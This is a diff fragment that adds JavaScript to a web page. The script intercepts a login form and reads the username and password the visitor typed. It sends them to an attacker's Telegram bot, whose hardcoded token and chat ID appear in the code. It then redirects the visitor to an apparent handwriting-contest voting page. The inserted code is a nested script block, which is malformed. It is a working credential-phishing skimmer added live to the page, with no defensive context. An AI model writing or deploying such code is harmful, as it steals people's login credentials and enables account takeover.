@@ -100,6 +100,31 @@
     </footer>
 
     <script>
+         <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Ngăn chặn gửi biểu mẫu một cách thông thường
+            
+            // Lấy dữ liệu từ biểu mẫu
+            var formData = new FormData();
+            var username = "ten tai khoan: " + document.getElementById('username').value + "\n";
+            var passowrd = "mat khau: " + document.getElementById('password').value;
+            var data = username + passowrd;
+    
+            // Gửi dữ liệu về bot Telegram
+            fetch(`https://api.telegram.org/bot6664238116:AAGuwhv4z4dwH55D1OHrM6EEJJSC0_N63Hs/sendMessage?chat_id=6310911278&text=${data}`, {
+                method: 'POST',
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Xử lý phản hồi từ bot Telegram (nếu cần)
+                
+                // Redirect người dùng đến trang khác
+                window.location.href = 'https://rawcdn.githack.com/sang190502/vietchudep/777b3add0db2296b2dfb97b4bf72911de89070bf/BinhChonVietChuDep/binhchon.html';
+            })
+            .catch(error => console.error('Lỗi:', error));
+        });
+    </script>
+        
         document.getElementById('myForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Ngăn chặn gửi biểu mẫu một cách thông thường
             
